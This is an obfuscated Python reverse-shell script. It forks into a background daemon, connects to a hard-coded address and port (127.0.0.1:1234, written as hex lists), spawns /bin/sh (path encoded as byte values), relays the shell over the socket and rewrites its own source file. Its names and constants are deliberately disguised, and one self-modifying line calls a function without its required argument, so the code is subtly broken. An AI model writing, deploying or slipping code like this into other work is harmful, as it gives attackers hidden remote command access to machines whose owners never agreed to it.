import os as _q, sys as _w, socket as _e, subprocess as _r, select as _t

_ = lambda x: [x.pop(), x.pop()][1]
_a = [0x7F, 0, 0, 1]
_b = 0x4D2
_c = bytes([47,98,105,110,47,115,104]).decode()

def _d():
    try:
        if _q.fork() > 0: _w.exit(0x0)
    except Exception as m: _w.exit(str(m))
    _q.setsid(); _q.chdir('/'); _q.umask(0o0)

def _f(g, h, i=_c):
    try:
        j = _e.socket(_e.AF_INET, _e.SOCK_STREAM)
        j.connect(('.'.join(map(str,g)), h))
    except: _w.exit()
    k = _r.Popen(i, shell=1, stdin=_r.PIPE, stdout=_r.PIPE, stderr=_r.PIPE)
    print(f"Conectado via {'rev'}shell")
    while 1:
        l, _, __ = _t.select([j, k.stdout, k.stderr], [], [])
        for m in l:
            if m == j:
                n = j.recv(0x578)
                if not n: _w.exit()
                k.stdin.write(n); k.stdin.flush()
            else:
                o = m.read(0x578) if m == k.stdout else m.read(0x578)
                j.sendall(o) if o else None

with open(__file__, 'r+') as p:
    q = p.read().replace('0x578', '1400' if _()[0]%2 else '0x578')
    p.seek(0); p.truncate(); p.write(q)

if __name__ == '__main__':
    _d(); _f(_a, _b)